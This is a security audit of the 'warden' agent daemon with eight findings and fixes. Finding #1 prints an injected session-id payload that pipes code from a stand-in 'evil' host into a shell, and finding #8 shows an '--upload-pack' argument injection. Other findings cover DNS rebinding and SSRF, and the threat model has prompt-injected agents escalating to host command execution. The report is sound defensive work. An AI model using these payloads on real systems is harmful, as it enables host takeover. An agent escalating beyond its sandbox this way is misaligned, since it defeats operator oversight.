# Warden security audit — 2026-06-28

Scope: a read-only review of warden's security-sensitive surfaces — the
remote-access auth layer, the daemon HTTP/WS API, command/process execution
(tmux + agent launch), session/store path handling, import/adopt, the plugin
runner, and the webhook notifier. Reviewed at `da5132a` on branch
`security/audit-findings` (worktree off `main`).

This is an analysis-only document. No production code was changed.

Severity is rated against warden's stated threat model: a **personal/team tool**
where a single bearer token grants full control, the daemon defaults to loopback,
and authenticated callers include the agents warden itself spawns (so
prompt-injected agents are partially in-scope as attackers).

### What is already done well (so it isn't regressed)

- **Token hygiene** — 256-bit `crypto/rand` token (`internal/auth/token.go`),
  `subtle.ConstantTimeCompare` in `authorize`, atomic `0600` token file with
  `0700` parent, never persisted into the config file.
- **Auth-failure throttling** — per-source-IP failure windows with pruning
  (`internal/daemon/authlimit.go`); a valid token is checked first so legit
  clients are never locked out, and it deliberately does *not* trust
  `X-Forwarded-For` for the throttle key.
- **No shell for managed commands** — `lifecycle.ExecRunner` uses
  `exec.CommandContext(name, args...)` (argv, no `sh -c`); the few real `sh -c`
  uses pass untrusted data as positional `$1`/`$2`, not interpolated into the
  script.
- **Consistent arg quoting** — every backend adapter wraps model/name/session-id
  in `shellQuoteArg` (proper single-quote escaping) — *except* the one path in
  finding #1.
- **Path-traversal guard on session ids** — `store.safeID` rejects `/`, `\`,
  `:`, and `..` before an id becomes a filename.
- **Workdir pinning** — `pinnedWorkdir` (`internal/daemon/git_routes.go`) forces
  an agent's git/check actions onto its *own* worktree, ignoring a client-supplied
  path — blocks a cross-worktree action.
- **Loopback-by-default + a hard guard** — default bind is `127.0.0.1:8765`, and
  `warden daemon` refuses a non-loopback bind without a token
  (`requireTokenForNonLoopback`, `internal/cli/daemon.go`). Post-#7 this is
  unconditional: `allow_nonloopback` no longer relaxes it.
- **WebSocket origin enforcement** — `coder/websocket`'s `Accept` defaults to
  same-origin checking, so the attach/cockpit PTY bridges resist cross-site
  WebSocket hijacking.
- **Body cap + timeouts** — `maxBytes(1 MiB)`, `writeTimeout(30s)`,
  `ReadHeaderTimeout`, `MaxHeaderBytes`.
- **Data-dir hardening** — `HardenDataDir` chmods the data root and known
  subdirs to `0700`.

## Findings

### 1. Medium — Unquoted session-id flows into a shell line; injectable via import/adopt

**Where:** `internal/agentbackend/backends/claude.go`

```go
func (Claude) LaunchCmd(o agentbackend.LaunchOpts) string {
    return base(o.Model, o.Mode) + " --session-id " + o.SessionID + " --name " + shellQuoteArg(o.Name)
}
func (Claude) ResumeCmd(o agentbackend.ResumeOpts) (string, bool) {
    return base(o.Model, o.Mode) + " --resume " + o.SessionID + " --name " + shellQuoteArg(o.Name), true
}
```

`o.SessionID` is concatenated **without `shellQuoteArg`** (the inline comment
assumes "a generated UUID, safe charset"). The resulting string is sent to the
agent's pane via `tmux send-keys -t <id> <launch> Enter` — i.e. it is executed by
the shell inside the tmux pane. Model and Name on the same line *are* quoted;
SessionID is the lone exception.

At **spawn** time this is safe: `Spawn` always mints `ClaudeSessionID` via
`store.NewSessionID()` (a UUID). The exposure is the **resume/restore/adopt and
import** paths, where `ClaudeSessionID` comes from *stored* data rather than a
fresh mint:

- `Restore` → `resumeInTmux(..., sess.ClaudeSessionID, ...)`
  (`internal/lifecycle/lifecycle.go:1312, 1261-1276`) passes the stored value
  straight into `ResumeCmd`.
- `ClaudeSessionID` is a free-form JSON field on `store.Session`
  (`internal/store/types.go:149`). `store.safeID` validates only the **primary
  id** (the filename), *not* `ClaudeSessionID`.
- `POST /api/v1/import` (`importSessions`, `internal/daemon/import_routes.go`,
  wired at `strict_collab.go:305`) inserts attacker-provided session records
  verbatim via `store.Insert`, with no validation of `ClaudeSessionID`.

**Attack:** an authenticated caller imports a record like

```json
{ "id": "agent-aaaa", "backend": "claude",
  "claude_session_id": "x; curl https://evil/sh | sh #", "workdir": "/repo" }
```

then triggers restore/adopt. The pane shell runs
`claude ... --resume x; curl https://evil/sh | sh # --name 'agent-aaaa'` →
arbitrary command execution on the host, **outside** any agent permission
sandbox. Because warden-spawned agents are themselves authenticated MCP callers,
a prompt-injected agent that can reach the import/adopt tools can self-escalate
to host RCE.

**Why it matters despite needing auth:** it converts API access (which is
*supposed* to grant control of agents within their sandboxes) into direct host
command execution, defeating the per-agent permission model — a privilege
escalation, not just "an authed user can do authed things".

**Fix (small, no behavior change for legit ids):**
- Wrap the value: `" --session-id " + shellQuoteArg(o.SessionID)` and likewise
  for `--resume`. A real UUID is unchanged by single-quoting.
- Defense-in-depth: validate `ClaudeSessionID` on `Insert`/import against a
  UUID/`[A-Za-z0-9-]` charset and reject anything else.

### 2. Medium — No Host-header / DNS-rebinding defense in the default no-auth mode

**Where:** `internal/daemon/api.go` (`router`), `internal/daemon/server.go`
(`http.Server`), default `Addr: "127.0.0.1:8765"` with auth off
(`internal/config/config.go:210`).

In the default configuration the daemon binds loopback with **no token**, so
`authorize` returns `true` for every request. The REST API performs **no Host
allowlisting**, and Go's `net/http` accepts any `Host` value. The WebSocket
bridges are protected by `coder/websocket`'s same-origin check, but the
**side-effecting REST routes are not** (`spawn`, `git`, `terminate`, …).

**Attack (DNS rebinding):** the user visits a malicious page. The attacker's
domain first resolves normally, then re-resolves to `127.0.0.1`. Page JS issues
requests to `http://attacker-domain:8765/api/v1/...`; after rebinding these are
**same-origin to the page**, so no CORS preflight is required and the browser
sends them to the local daemon. With auth disabled, the page can spawn an agent
(finding #1, or simply a malicious prompt/`--dangerously-skip-permissions`-style
mode) → host compromise. The public `GET /api/docs` and the unauthenticated SPA
shell also disclose the exact API shape to anyone, easing this.

**Note:** CORS being *absent* blocks ordinary cross-origin JSON reads, but DNS
rebinding sidesteps CORS entirely by making the request same-origin — so "we set
no CORS headers" is **not** a defense here.

**Fix:**
- Validate the `Host` header on the API group: accept only
  `localhost` / `127.0.0.1` / `[::1]` (with the configured port) when bound to
  loopback; reject others with 421/403. This is the standard rebinding
  mitigation and is cheap middleware.
- Stronger: require a bearer token even on loopback (the file-based
  `ResolveToken` already lets local clients authenticate transparently), making
  the token — not the network position — the trust boundary.

### 3. Low — Webhook notifier is an unrestricted egress/SSRF sink

**Where:** `internal/notify/webhook.go`.

`NewWebhook(url)` POSTs notification payloads (agent titles/bodies) to an
arbitrary URL using a default `http.Client`, which **follows redirects** and has
**no scheme/host allowlist**. The URL is operator-configured
(`notify.webhook_url`), not request-supplied, so this is Low — but: (a) it can be
pointed at internal/metadata endpoints (`169.254.169.254`, internal services),
(b) it leaks agent activity text to that endpoint, and (c) a config-write path
(if any future feature lets the API edit config) would upgrade this to a
remotely-triggerable SSRF.

**Fix:** document the webhook URL as trusted egress; optionally disallow
redirects, require `https`, and/or refuse RFC-1918/link-local hosts unless an
explicit `allow_private` flag is set.

**Status: Fixed (hardening batch 2).** `internal/notify/webhook.go` now (a)
validates the scheme is `http`/`https` at construction and degrades a bad URL to
a logged no-op, (b) sets `CheckRedirect` to refuse all 3xx (the redirect-pivot
is the main SSRF lever), and (c) installs a `net.Dialer.Control` guard that
refuses link-local destinations (the `169.254.169.254` cloud-metadata endpoint
and `fe80::/10`) after name resolution — so a hostname that resolves to
link-local is caught too. Loopback and RFC-1918 targets are intentionally still
allowed: a local/LAN notification relay is a supported configuration, and
blocking it would break legitimate setups. Per-actor leakage of notification
text to the (operator-chosen) endpoint is inherent to having a webhook and is
left documented rather than blocked.

### 4. Low — Audit attribution collapses behind a proxy; no per-actor identity

**Where:** `internal/daemon/audit_hook.go` (`recordAudit` → `clientIP`),
`internal/daemon/authlimit.go` (`clientIP`).

Using `RemoteAddr` (not `X-Forwarded-For`) is the **correct** choice for the
throttle key. But the audit log reuses the same `clientIP` as the actor, so every
remote action taken through a Cloudflare Tunnel / reverse proxy is recorded as
`127.0.0.1`. Combined with the single shared token (no caller identity), the
audit trail cannot distinguish *who* did what once the daemon is exposed.

**Fix:** for the audit actor only (not throttling), optionally honor
`X-Forwarded-For` when the immediate peer is a configured trusted proxy; or
record a token/client label once scoped tokens exist (finding #5).

### 5. Low/Info — Single shared, full-access, non-expiring token

**Where:** `internal/daemon/middleware.go` (`authScope` has `scopeNone` /
`scopeFull` only).

The code already carries the seam for scoped tokens (`authorize` returns a
scope), but only full access exists. There is one shared secret: no per-client
tokens, no read-only tokens, no expiry, no revocation list (rotation is a
token-file rewrite + reload). Acceptable for the personal-tool model; a gap for
any multi-user or "give a teammate read-only" scenario.

**Fix (future):** issue scoped/expiring tokens and branch routes on the returned
scope (the architecture already anticipates this).

### 6. Info — Prompt files rely on directory perms, not file perms

**Where:** `internal/lifecycle/lifecycle.go:1038, 1770`.

`l.run.Run(ctx, "", "sh", "-c", "printf '%s' \"$1\" > \"$2\"", "sh", prompt, promptFile)`
creates the prompt file with the daemon's umask (commonly `0644`). Task prompts
can contain sensitive context. Contents are currently protected only because
`PromptsDir` is `0700`. Defense-in-depth: create the file `0600` explicitly
(e.g. write via Go `os.OpenFile(..., 0o600)` instead of a shell redirect, which
also removes the last untrusted-data-into-`sh -c` call).

**Status: Fixed (hardening batch 2).** Both write sites
(`spawnFreeForm`, `writePromptFile`) now prefix the redirect with `umask 077`, so
the prompt file is created `0600` regardless of the daemon's umask. The write
stays on the `Runner` seam (the prompt is still passed as positional `$1`, never
interpolated into the script, so there was no injection exposure to remove — the
gap was purely the inherited file mode).

### 7. Info — `allow_nonloopback` disables auth on a public bind

**Where:** `internal/cli/daemon.go:77`.

The guard refusing a non-loopback bind without a token can be switched off with
`allow_nonloopback: true`, which then serves the **full unauthenticated API on
all interfaces**. It is documented as "not recommended", but it is a sharp
foot-gun. Consider never allowing a non-loopback bind without a token regardless
of this flag (i.e. the flag relaxes the warning, but a token stays mandatory),
or at minimum auto-binding `Host`-validation (finding #2) whenever it is set.

**Status: Fixed.** The escape hatch is removed: `requireTokenForNonLoopback`
(`internal/cli/daemon.go`) refuses to start on any non-loopback address without
`WARDEN_TOKEN`, and `allow_nonloopback` is now an inert, deprecated no-op (kept
so existing configs still parse; setting it true only logs a deprecation warning
and points the operator at `WARDEN_TOKEN`). Because a tokenless daemon is now
always loopback-bound, the #2 `hostGuard` is no longer bypassable via a spoofed
`Host: 127.0.0.1` — there is no unauthenticated public bind for such a request
to reach. Docs updated: `README.md`, `docs/USAGE.md`, `docs/FEATURES.md`, and the
website `reference/env-vars.md` + `guides/remote-access.md`.

### 8. Medium — Option-like git ref is argument-injected into a `git`/`gh` argv

**Where:** `internal/lifecycle/git.go` (`Sync` → `git fetch origin <base>`),
`internal/lifecycle/lifecycle.go` (`ensureWorktree` → `gh pr checkout <pr>` /
`git worktree add <rel> <branch>`, `SpawnJob` → `git worktree add … <baseBranch>`).

Every `git`/`gh` call runs through `ExecRunner` (`exec.Command` with an argv, no
shell), so shell metacharacters in a ref are inert — that is the codebase's
existing, correct defense against command injection. But several **user-supplied
refs flow in as positional arguments**, and a value beginning with `-` is parsed
by `git`/`gh` as an **option**, not a ref:

- `POST /api/v1/sync` body `base` → `git fetch origin <base>`. A `base` of
  `--upload-pack=<cmd>` becomes `git fetch origin --upload-pack=<cmd>`, which
  executes `<cmd>` on transports that honor it (e.g. a local/`file:` remote) —
  argument injection → potential host command execution.
- Spawn `pr` → `gh pr checkout <pr>`; spawn `branch` → `git worktree add <rel>
  <branch>`; pipeline `base_branch` → `git worktree add … <base_branch>`. Each is
  a positional an attacker can turn into a flag.

Like finding #1, this is reachable by any authenticated caller — including the
agents warden itself spawns — so a prompt-injected agent that can reach `sync` or
spawn can escalate beyond its sandbox. `gh pr create --base <base>` is **not**
affected: there `base` is the value of the `--base` flag, not a positional.

**Fix (applied):** a `safeGitRef` guard (`internal/lifecycle/gitref.go`) rejects
any ref beginning with `-` at the exec sink — necessary and sufficient for argv
argument injection (git refs never legitimately start with `-`), with no charset
allowlist that could reject valid branch names. Wired into `Sync` (`base`),
`ensureWorktree` (`branch`, `pr`), and `SpawnJob` (`base_branch`).

## Suggested remediation order

1. **#1** — one-line quoting fix + import-time `ClaudeSessionID` validation
   (highest impact, lowest effort).
2. **#2** — add a `Host`-allowlist middleware to the API group (closes the
   default-mode rebinding hole).
3. **#6** — write prompt files `0600` and drop the last untrusted `sh -c`.
4. **#3 / #4 / #7** — documentation + optional hardening flags.
5. **#5** — scoped tokens, when multi-user becomes a goal.
